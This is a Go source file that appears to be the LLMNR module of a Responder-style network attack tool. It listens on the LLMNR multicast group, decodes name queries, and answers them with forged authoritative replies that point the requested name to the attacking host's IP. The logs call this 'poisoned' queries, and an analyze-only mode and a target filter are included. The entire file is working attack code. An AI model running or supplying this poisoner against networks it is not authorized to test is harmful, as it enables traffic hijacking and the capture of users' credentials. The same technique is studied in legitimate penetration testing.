package main

import (
	"encoding/binary"
	"fmt"
	"net"
)

const llmnrMulticast = "224.0.0.252"
const llmnrPort = 5355

func poisonLLMNR(ifaceIP net.IP) {
	iface, err := ifaceByIP(ifaceIP)
	if err != nil {
		logError("LLMNR ifaceByIP: %v", err)
		return
	}

	group := &net.UDPAddr{IP: net.ParseIP(llmnrMulticast), Port: llmnrPort}
	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		logError("LLMNR multicast listen — %v (need root?)", err)
		return
	}
	defer conn.Close()

	logInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := parseLLMNRQuery(pkt)
		if name == "" {
			continue
		}
		logVerbose("LLMNR query: %s from %s", name, src)
		if analyzeMode {
			logInfo("[LLMNR] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !shouldRespond(src, name) {
			logVerbose("LLMNR skipping '%s' from %s (filter)", name, src)
			continue
		}
		resp := buildLLMNRResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			logInfo("[LLMNR] Poisoned query for '%s' — responding with %s", name, ifaceIP)
		}
	}
}

// parseLLMNRQuery extracts the queried name from an LLMNR query packet.
func parseLLMNRQuery(pkt []byte) string {
	if len(pkt) < 12 {
		return ""
	}
	flags := binary.BigEndian.Uint16(pkt[2:4])
	if flags&0x8000 != 0 { // QR bit set = response
		return ""
	}
	qdCount := binary.BigEndian.Uint16(pkt[4:6])
	if qdCount == 0 {
		return ""
	}
	return decodeDNSName(pkt, 12)
}

// decodeDNSName reads a DNS label-encoded name starting at offset.
func decodeDNSName(pkt []byte, off int) string {
	var name []byte
	for off < len(pkt) {
		l := int(pkt[off])
		if l == 0 {
			break
		}
		off++
		if off+l > len(pkt) {
			break
		}
		if len(name) > 0 {
			name = append(name, '.')
		}
		name = append(name, pkt[off:off+l]...)
		off += l
	}
	return string(name)
}

// buildLLMNRResponse constructs an LLMNR response pointing to our IP.
func buildLLMNRResponse(query []byte, ip net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	txID := query[0:2]

	qStart := 12
	qEnd := qStart
	for qEnd < len(query) {
		l := int(query[qEnd])
		qEnd++
		if l == 0 {
			break
		}
		qEnd += l
	}
	if qEnd+4 > len(query) {
		return nil
	}
	qType := binary.BigEndian.Uint16(query[qEnd : qEnd+2])
	if qType != 1 && qType != 255 { // A or ANY
		return nil
	}
	qEnd += 4

	question := query[qStart:qEnd]

	var resp []byte
	resp = append(resp, txID...)
	resp = append(resp, 0x80, 0x00) // QR=1, authoritative
	resp = append(resp, 0x00, 0x01) // QDCOUNT=1
	resp = append(resp, 0x00, 0x01) // ANCOUNT=1
	resp = append(resp, 0x00, 0x00) // NSCOUNT
	resp = append(resp, 0x00, 0x00) // ARCOUNT
	resp = append(resp, question...)
	resp = append(resp, 0xC0, 0x0C) // name pointer
	resp = append(resp, 0x00, 0x01) // TYPE A
	resp = append(resp, 0x00, 0x01) // CLASS IN
	resp = append(resp, 0x00, 0x00, 0x00, 0x1E) // TTL 30s
	resp = append(resp, 0x00, 0x04)              // RDLENGTH
	resp = append(resp, ip.To4()...)

	return resp
}

// ifaceByIP finds the network interface that has the given IP.
func ifaceByIP(ip net.IP) (*net.Interface, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for i := range ifaces {
		addrs, _ := ifaces[i].Addrs()
		for _, a := range addrs {
			var ifIP net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ifIP = v.IP
			case *net.IPAddr:
				ifIP = v.IP
			}
			if ifIP != nil && ifIP.Equal(ip) {
				return &ifaces[i], nil
			}
		}
	}
	return nil, fmt.Errorf("no interface with IP %s", ip)
}
